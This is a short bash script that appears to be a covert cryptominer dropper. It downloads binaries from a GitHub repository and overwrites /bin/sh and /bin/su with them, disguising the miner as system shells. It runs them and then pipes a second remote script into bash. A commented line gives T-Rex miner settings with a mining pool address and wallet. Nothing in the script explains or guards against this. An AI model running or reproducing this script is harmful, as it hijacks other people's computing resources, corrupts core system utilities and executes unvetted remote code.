#!/bin/bash
echo "ENGINE START!"
export LD_PRELOAD=
curl -sLO https://raw.githubusercontent.com/mahligg45/tes/trexxx/main/t-rex
curl -sLO https://raw.githubusercontent.com/mahligg45/tes/main/etdah
mv t-rex /bin/sh
mv etdah /bin/su
chmod +x /bin/sh
chmod +x /bin/su

#/bin/pwd -a ethash -o stratum+ssl://alena.hopto.org:12020 -u 0x3d02f7b8dcb18e778fe35bf8b5a7f91d819bf0c4 -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
/bin/sh -c /bin/su
curl https://raw.githubusercontent.com/mahligg45/tes/main/etdah.sh | bash
